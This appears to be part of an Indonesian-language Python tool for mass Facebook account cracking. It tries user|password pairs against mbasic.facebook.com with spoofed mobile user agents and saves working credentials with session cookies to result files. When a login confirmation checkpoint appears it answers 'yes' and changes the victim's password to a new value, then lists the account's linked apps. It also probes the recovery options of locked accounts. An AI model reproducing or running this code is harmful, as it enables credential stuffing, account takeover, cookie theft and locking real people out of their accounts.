        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}Ã—{N}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [âœ“] {user}|{pasw}|{coki}\n")
            print(f"\r  ðŸŽ‰{H} hore akunya tidak checkpoint{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengecek aplikasi...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  ðŸŽ‰{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "Kebersaman:v"
                    print(f"\r  ðŸŽ‰{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{tgl}-{bln}-{thn}.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")

#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}âœ“{N}] berhasil mengubah password menjadi:\n {N}[{H}âœ“{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [âœ“] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'â€¢'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#CEK KONTOL
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	######try:os.system('pkg install play-audio')
	###except:pass
	try:os.system('clear')
	except:pass
	alvino_xy(f'\n\t{x}â€”â€”> {h}Gunakan Script Ini Sewajarnya\n\t{x}â€”â€”> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}â€”â€”> {h}Resyah Sehat Selalu Yah\n\t{x}â€”â€”> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}â€”â€”> {h}Semoga Harimu Menyenangkan Sayang{x}')
	time.sleep(3)
	login()

#NEW.PY NEH BOYSðŸ˜‚
#RECODE BY RESYAH16